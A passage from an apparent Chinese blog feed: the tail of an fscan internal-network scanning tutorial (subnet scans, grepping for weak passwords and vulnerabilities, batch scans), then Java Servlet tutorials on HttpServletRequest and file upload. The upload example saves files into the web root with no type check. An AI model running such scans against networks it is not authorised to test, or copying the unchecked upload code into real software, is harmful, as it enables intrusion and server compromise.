scan_results.txt &gt; weak_passwords.txt</span><br><span class="line">grep <span class="string">&quot;vulnerable&quot;</span> scan_results.txt &gt; vulnerabilities.txt</span><br></pre></td></tr></table></figure></div></li></ol><h2 id="8-进阶用法"><a href="#8-进阶用法" class="headerlink" title="8. 进阶用法"></a>8. 进阶用法</h2><h3 id="8-1-与其他工具联动"><a href="#8-1-与其他工具联动" class="headerlink" title="8.1 与其他工具联动"></a>8.1 与其他工具联动</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 扫描结果传递给其他工具</span></span><br><span class="line">./fscan -h 192.168.1.1/24 -p 80,443 -o web_servers.txt</span><br><span class="line"><span class="built_in">cat</span> web_servers.txt | grep open | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> &gt; targets.txt</span><br><span class="line"><span class="comment"># 将targets.txt传给其他漏洞扫描工具</span></span><br></pre></td></tr></table></figure></div><h3 id="8-2-自定义扫描模板"><a href="#8-2-自定义扫描模板" class="headerlink" title="8.2 自定义扫描模板"></a>8.2 自定义扫描模板</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为特定环境创建扫描脚本</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">&#x27;EOF&#x27;</span> &gt; custom_scan.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># 快速扫描脚本</span></span><br><span class="line">./fscan -h <span class="variable">$1</span> -p 22,80,443,3306,3389 -o quick_scan.txt</span><br><span class="line"><span class="comment"># 分析结果</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;发现开放服务:&quot;</span></span><br><span class="line">grep <span class="string">&quot;open&quot;</span> quick_scan.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;发现漏洞:&quot;</span></span><br><span class="line">grep <span class="string">&quot;vulnerable&quot;</span> quick_scan.txt</span><br><span class="line">EOF</span><br><span class="line"><span class="built_in">chmod</span> +x custom_scan.sh</span><br><span class="line">./custom_scan.sh 192.168.1.1/24</span><br></pre></td></tr></table></figure></div><h3 id="8-3-批量扫描"><a href="#8-3-批量扫描" class="headerlink" title="8.3 批量扫描"></a>8.3 批量扫描</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建目标文件</span></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">&#x27;EOF&#x27;</span> &gt; targets.txt</span><br><span class="line">192.168.1.0/24</span><br><span class="line">192.168.2.0/24</span><br><span class="line">10.10.10.1-100</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量扫描</span></span><br><span class="line">./fscan -h targets.txt -o batch_results.txt</span><br></pre></td></tr></table></figure></div><p>未经授权的扫描可能违反法律法规</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    <category term="渗透" scheme="http://example.com/categories/web/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="渗透测试" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    <category term="内网扫描" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F/"/>
    
    <category term="网络安全" scheme="http://example.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    <category term="漏洞扫描" scheme="http://example.com/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>HttpServletRequest详解</title>
    <link href="http://example.com/2025/04/05/java/servlet/HttpServletRequest/"/>
    <id>http://example.com/2025/04/05/java/servlet/HttpServletRequest/</id>
    <published>2025-04-05T20:00:00.000Z</published>
    <updated>2025-04-26T11:30:29.883Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HttpServletRequest接口详解"><a href="#HttpServletRequest接口详解" class="headerlink" title="HttpServletRequest接口详解"></a>HttpServletRequest接口详解</h1><p><code>HttpServletRequest</code>是Servlet API中的核心接口，用于封装来自客户端的HTTP请求信息。本文将详细介绍该接口的所有方法及其用法。</p><h2 id="请求参数相关方法"><a href="#请求参数相关方法" class="headerlink" title="请求参数相关方法"></a>请求参数相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>String getParameter(String name)</code></td><td>获取指定名称的请求参数</td></tr><tr><td><code>Map&lt;String, String[]&gt; getParameterMap()</code></td><td>获取所有参数的映射表</td></tr><tr><td><code>Enumeration&lt;String&gt; getParameterNames()</code></td><td>获取所有参数名</td></tr><tr><td><code>String[] getParameterValues(String name)</code></td><td>获取指定名称的所有参数值</td></tr></tbody></table><h2 id="请求头相关方法"><a href="#请求头相关方法" class="headerlink" title="请求头相关方法"></a>请求头相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>String getHeader(String name)</code></td><td>获取指定名称的请求头值</td></tr><tr><td><code>Enumeration&lt;String&gt; getHeaders(String name)</code></td><td>获取指定名称的所有请求头值</td></tr><tr><td><code>Enumeration&lt;String&gt; getHeaderNames()</code></td><td>获取所有请求头名称</td></tr><tr><td><code>int getIntHeader(String name)</code></td><td>获取指定名称的请求头值作为整型</td></tr><tr><td><code>long getDateHeader(String name)</code></td><td>获取指定名称的请求头值作为日期类型</td></tr></tbody></table><h2 id="Cookie相关方法"><a href="#Cookie相关方法" class="headerlink" title="Cookie相关方法"></a>Cookie相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>Cookie[] getCookies()</code></td><td>获取所有Cookie</td></tr></tbody></table><h2 id="会话管理相关方法"><a href="#会话管理相关方法" class="headerlink" title="会话管理相关方法"></a>会话管理相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>HttpSession getSession()</code></td><td>获取当前会话，不存在则创建</td></tr><tr><td><code>HttpSession getSession(boolean create)</code></td><td>获取当前会话，根据参数决定是否创建</td></tr><tr><td><code>String getRequestedSessionId()</code></td><td>获取请求的会话ID</td></tr><tr><td><code>boolean isRequestedSessionIdValid()</code></td><td>检查会话ID是否有效</td></tr><tr><td><code>boolean isRequestedSessionIdFromCookie()</code></td><td>检查会话ID是否来自Cookie</td></tr><tr><td><code>boolean isRequestedSessionIdFromURL()</code></td><td>检查会话ID是否来自URL</td></tr><tr><td><code>boolean isRequestedSessionIdFromUrl()</code></td><td>(已废弃)使用isRequestedSessionIdFromURL()</td></tr></tbody></table><h2 id="请求路径相关方法"><a href="#请求路径相关方法" class="headerlink" title="请求路径相关方法"></a>请求路径相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>String getContextPath()</code></td><td>获取应用上下文路径</td></tr><tr><td><code>String getServletPath()</code></td><td>获取Servlet路径</td></tr><tr><td><code>String getPathInfo()</code></td><td>获取额外的路径信息</td></tr><tr><td><code>String getPathTranslated()</code></td><td>获取转换后的路径</td></tr><tr><td><code>String getQueryString()</code></td><td>获取请求URL中的查询字符串</td></tr><tr><td><code>String getRequestURI()</code></td><td>获取请求URI</td></tr><tr><td><code>StringBuffer getRequestURL()</code></td><td>获取请求URL</td></tr><tr><td><code>String getMethod()</code></td><td>获取HTTP请求方法</td></tr></tbody></table><h2 id="协议相关方法"><a href="#协议相关方法" class="headerlink" title="协议相关方法"></a>协议相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>String getProtocol()</code></td><td>获取请求协议名称和版本</td></tr><tr><td><code>String getScheme()</code></td><td>获取请求协议方案(http&#x2F;https)</td></tr><tr><td><code>boolean isSecure()</code></td><td>检查是否是安全连接(HTTPS)</td></tr></tbody></table><h2 id="客户端信息相关方法"><a href="#客户端信息相关方法" class="headerlink" title="客户端信息相关方法"></a>客户端信息相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>String getServerName()</code></td><td>获取服务器名称</td></tr><tr><td><code>int getServerPort()</code></td><td>获取服务器端口号</td></tr><tr><td><code>String getRemoteAddr()</code></td><td>获取客户端IP地址</td></tr><tr><td><code>String getRemoteHost()</code></td><td>获取客户端主机名</td></tr><tr><td><code>int getRemotePort()</code></td><td>获取客户端端口号</td></tr><tr><td><code>String getLocalAddr()</code></td><td>获取服务器IP地址</td></tr><tr><td><code>String getLocalName()</code></td><td>获取服务器主机名</td></tr><tr><td><code>int getLocalPort()</code></td><td>获取服务器端口号</td></tr></tbody></table><h2 id="请求体相关方法"><a href="#请求体相关方法" class="headerlink" title="请求体相关方法"></a>请求体相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>BufferedReader getReader()</code></td><td>获取字符输入流读取请求体</td></tr><tr><td><code>ServletInputStream getInputStream()</code></td><td>获取二进制输入流读取请求体</td></tr><tr><td><code>String getCharacterEncoding()</code></td><td>获取请求体字符编码</td></tr><tr><td><code>void setCharacterEncoding(String env)</code></td><td>设置请求体字符编码</td></tr><tr><td><code>int getContentLength()</code></td><td>获取请求体长度</td></tr><tr><td><code>long getContentLengthLong()</code></td><td>获取请求体长度(long类型)</td></tr><tr><td><code>String getContentType()</code></td><td>获取请求体内容类型</td></tr></tbody></table><h2 id="请求属性相关方法"><a href="#请求属性相关方法" class="headerlink" title="请求属性相关方法"></a>请求属性相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>Object getAttribute(String name)</code></td><td>获取指定名称的请求属性</td></tr><tr><td><code>Enumeration&lt;String&gt; getAttributeNames()</code></td><td>获取所有请求属性名</td></tr><tr><td><code>void setAttribute(String name, Object o)</code></td><td>设置请求属性</td></tr><tr><td><code>void removeAttribute(String name)</code></td><td>移除请求属性</td></tr></tbody></table><h2 id="请求分发相关方法"><a href="#请求分发相关方法" class="headerlink" title="请求分发相关方法"></a>请求分发相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>RequestDispatcher getRequestDispatcher(String path)</code></td><td>获取请求分发器</td></tr></tbody></table><h2 id="安全认证相关方法"><a href="#安全认证相关方法" class="headerlink" title="安全认证相关方法"></a>安全认证相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>String getAuthType()</code></td><td>获取认证类型</td></tr><tr><td><code>String getRemoteUser()</code></td><td>获取已认证的用户名</td></tr><tr><td><code>boolean isUserInRole(String role)</code></td><td>检查用户是否在指定角色中</td></tr><tr><td><code>Principal getUserPrincipal()</code></td><td>获取用户Principal对象</td></tr></tbody></table><h2 id="常用方法详解"><a href="#常用方法详解" class="headerlink" title="常用方法详解"></a>常用方法详解</h2><h3 id="获取请求参数"><a href="#获取请求参数" class="headerlink" title="获取请求参数"></a>获取请求参数</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取单个参数</span></span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取多值参数</span></span><br><span class="line">String[] hobbies = request.getParameterValues(<span class="string">&quot;hobby&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有参数名称</span></span><br><span class="line">Enumeration&lt;String&gt; paramNames = request.getParameterNames();</span><br><span class="line"><span class="keyword">while</span> (paramNames.hasMoreElements()) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> paramNames.nextElement();</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> request.getParameter(name);</span><br><span class="line">    System.out.println(name + <span class="string">&quot;: &quot;</span> + value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取参数Map</span></span><br><span class="line">Map&lt;String, String[]&gt; paramMap = request.getParameterMap();</span><br><span class="line"><span class="keyword">for</span> (String name : paramMap.keySet()) &#123;</span><br><span class="line">    String[] values = paramMap.get(name);</span><br><span class="line">    <span class="comment">// 处理参数值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="获取请求头"><a href="#获取请求头" class="headerlink" title="获取请求头"></a>获取请求头</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取单个请求头</span></span><br><span class="line"><span class="type">String</span> <span class="variable">userAgent</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;User-Agent&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有请求头名称</span></span><br><span class="line">Enumeration&lt;String&gt; headerNames = request.getHeaderNames();</span><br><span class="line"><span class="keyword">while</span> (headerNames.hasMoreElements()) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> headerNames.nextElement();</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> request.getHeader(name);</span><br><span class="line">    System.out.println(name + <span class="string">&quot;: &quot;</span> + value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取特定类型的请求头</span></span><br><span class="line"><span class="type">int</span> <span class="variable">contentLength</span> <span class="operator">=</span> request.getIntHeader(<span class="string">&quot;Content-Length&quot;</span>);</span><br><span class="line"><span class="type">long</span> <span class="variable">lastModified</span> <span class="operator">=</span> request.getDateHeader(<span class="string">&quot;If-Modified-Since&quot;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="会话管理"><a href="#会话管理" class="headerlink" title="会话管理"></a>会话管理</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取会话对象，如果不存在则创建</span></span><br><span class="line"><span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取会话对象，如果不存在则返回null</span></span><br><span class="line"><span class="type">HttpSession</span> <span class="variable">session</span> <span class="operator">=</span> request.getSession(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查会话ID是否有效</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isSessionValid</span> <span class="operator">=</span> request.isRequestedSessionIdValid();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取会话ID</span></span><br><span class="line"><span class="type">String</span> <span class="variable">sessionId</span> <span class="operator">=</span> request.getRequestedSessionId();</span><br></pre></td></tr></table></figure></div><h3 id="获取请求路径信息"><a href="#获取请求路径信息" class="headerlink" title="获取请求路径信息"></a>获取请求路径信息</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取请求URL和URI</span></span><br><span class="line"><span class="type">StringBuffer</span> <span class="variable">requestURL</span> <span class="operator">=</span> request.getRequestURL(); <span class="comment">// 例如：http://localhost:8080/app/page</span></span><br><span class="line"><span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> request.getRequestURI();     <span class="comment">// 例如：/app/page</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取上下文路径</span></span><br><span class="line"><span class="type">String</span> <span class="variable">contextPath</span> <span class="operator">=</span> request.getContextPath();   <span class="comment">// 例如：/app</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取Servlet路径</span></span><br><span class="line"><span class="type">String</span> <span class="variable">servletPath</span> <span class="operator">=</span> request.getServletPath();   <span class="comment">// 例如：/page</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取查询字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">queryString</span> <span class="operator">=</span> request.getQueryString();   <span class="comment">// 例如：id=123&amp;name=test</span></span><br></pre></td></tr></table></figure></div><h3 id="获取客户端信息"><a href="#获取客户端信息" class="headerlink" title="获取客户端信息"></a>获取客户端信息</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取客户端IP地址</span></span><br><span class="line"><span class="type">String</span> <span class="variable">clientIP</span> <span class="operator">=</span> request.getRemoteAddr();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取请求方法</span></span><br><span class="line"><span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethod();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否为安全连接</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isSecure</span> <span class="operator">=</span> request.isSecure();</span><br></pre></td></tr></table></figure></div><h3 id="请求属性操作"><a href="#请求属性操作" class="headerlink" title="请求属性操作"></a>请求属性操作</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置请求属性</span></span><br><span class="line">request.setAttribute(<span class="string">&quot;user&quot;</span>, userObject);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取请求属性</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> (User) request.getAttribute(<span class="string">&quot;user&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除请求属性</span></span><br><span class="line">request.removeAttribute(<span class="string">&quot;user&quot;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="读取请求体"><a href="#读取请求体" class="headerlink" title="读取请求体"></a>读取请求体</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取文本数据</span></span><br><span class="line"><span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> request.getReader();</span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">requestBody</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">String line;</span><br><span class="line"><span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">    requestBody.append(line);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> requestBody.toString();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取二进制数据</span></span><br><span class="line"><span class="type">ServletInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line"><span class="comment">// 处理输入流...</span></span><br></pre></td></tr></table></figure></div><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li><code>getInputStream()</code>和<code>getReader()</code>是互斥的，不能在同一请求中同时调用</li><li>在调用<code>getReader()</code>之前应先设置正确的字符编码<code>setCharacterEncoding()</code></li><li>请求属性(<code>getAttribute</code>&#x2F;<code>setAttribute</code>)与请求参数(<code>getParameter</code>)不同，前者是在服务器端设置的，后者是从客户端提交的</li><li>对于文件上传等复杂表单，需要使用Apache Commons FileUpload等库来处理</li><li>请求参数获取不到时返回<code>null</code>，而不是抛出异常</li><li>处理敏感信息时，应注意对接收到的请求参数进行安全过滤，防止XSS等攻击</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="servlet" scheme="http://example.com/tags/servlet/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Servlet文件上传与下载实现</title>
    <link href="http://example.com/2025/04/05/java/servlet/servlet%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/"/>
    <id>http://example.com/2025/04/05/java/servlet/servlet%E5%AE%9E%E7%8E%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/</id>
    <published>2025-04-05T19:44:00.000Z</published>
    <updated>2025-04-26T11:30:29.883Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Servlet文件上传与下载实现"><a href="#Servlet文件上传与下载实现" class="headerlink" title="Servlet文件上传与下载实现"></a>Servlet文件上传与下载实现</h1><p>文件上传和下载是Web应用中常见的功能需求。本文将详细介绍如何使用Servlet技术实现文件的上传与下载。</p><h2 id="1-文件上传实现"><a href="#1-文件上传实现" class="headerlink" title="1. 文件上传实现"></a>1. 文件上传实现</h2><h3 id="1-1-基于Commons-FileUpload实现"><a href="#1-1-基于Commons-FileUpload实现" class="headerlink" title="1.1 基于Commons FileUpload实现"></a>1.1 基于Commons FileUpload实现</h3><p>Apache Commons FileUpload是一个用于处理HTTP文件上传的简单易用的组件。</p><h4 id="添加依赖"><a href="#添加依赖" class="headerlink" title="添加依赖"></a>添加依赖</h4><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-fileupload<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-io<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h4 id="完整代码示例"><a href="#完整代码示例" class="headerlink" title="完整代码示例"></a>完整代码示例</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/upload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FileUploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="comment">// 上传文件存储目录</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">UPLOAD_DIRECTORY</span> <span class="operator">=</span> <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">    <span class="comment">// 上传配置</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MEMORY_THRESHOLD</span> <span class="operator">=</span> <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">3</span>;  <span class="comment">// 3MB</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_FILE_SIZE</span> <span class="operator">=</span> <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">40</span>;    <span class="comment">// 40MB</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_REQUEST_SIZE</span> <span class="operator">=</span> <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">50</span>; <span class="comment">// 50MB</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 检测是否为多媒体上传</span></span><br><span class="line">        <span class="keyword">if</span> (!ServletFileUpload.isMultipartContent(request)) &#123;</span><br><span class="line">            <span class="comment">// 如果不是则停止</span></span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">            writer.println(<span class="string">&quot;错误：表单必须包含 enctype=multipart/form-data&quot;</span>);</span><br><span class="line">            writer.flush();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 配置上传参数</span></span><br><span class="line">        <span class="type">DiskFileItemFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DiskFileItemFactory</span>();</span><br><span class="line">        <span class="comment">// 设置内存临界值 - 超过后将产生临时文件并存储于临时目录中</span></span><br><span class="line">        factory.setSizeThreshold(MEMORY_THRESHOLD);</span><br><span class="line">        <span class="comment">// 设置临时存储目录</span></span><br><span class="line">        factory.setRepository(<span class="keyword">new</span> <span class="title class_">File</span>(System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>)));</span><br><span class="line">        </span><br><span class="line">        <span class="type">ServletFileUpload</span> <span class="variable">upload</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletFileUpload</span>(factory);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置最大文件上传值</span></span><br><span class="line">        upload.setFileSizeMax(MAX_FILE_SIZE);</span><br><span class="line">        <span class="comment">// 设置最大请求值(包含文件和表单数据)</span></span><br><span class="line">        upload.setSizeMax(MAX_REQUEST_SIZE);</span><br><span class="line">        <span class="comment">// 中文处理</span></span><br><span class="line">        upload.setHeaderEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构造临时路径来存储上传的文件</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uploadPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;./&quot;</span>) + File.separator + UPLOAD_DIRECTORY;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 如果目录不存在则创建</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadPath);</span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 解析请求的内容提取文件数据</span></span><br><span class="line">            List&lt;FileItem&gt; formItems = upload.parseRequest(request);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (formItems != <span class="literal">null</span> &amp;&amp; formItems.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 迭代处理每个文件</span></span><br><span class="line">                <span class="keyword">for</span> (FileItem item : formItems) &#123;</span><br><span class="line">                    <span class="comment">// 处理不在表单中的字段</span></span><br><span class="line">                    <span class="keyword">if</span> (!item.isFormField()) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(item.getName()).getName();</span><br><span class="line">                        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> uploadPath + File.separator + fileName;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">storeFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(filePath);</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment">// 在控制台输出文件的上传路径</span></span><br><span class="line">                        System.out.println(<span class="string">&quot;上传文件路径: &quot;</span> + filePath);</span><br><span class="line">                        </span><br><span class="line">                        <span class="comment">// 保存文件到硬盘</span></span><br><span class="line">                        item.write(storeFile);</span><br><span class="line">                        request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;文件上传成功!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            request.setAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;错误信息: &quot;</span> + ex.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 跳转到结果页面</span></span><br><span class="line">        getServletContext().getRequestDispatcher(<span class="string">&quot;/result.jsp&quot;</span>).forward(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="1-2-基于Servlet-3-0-MultipartConfig实现"><a 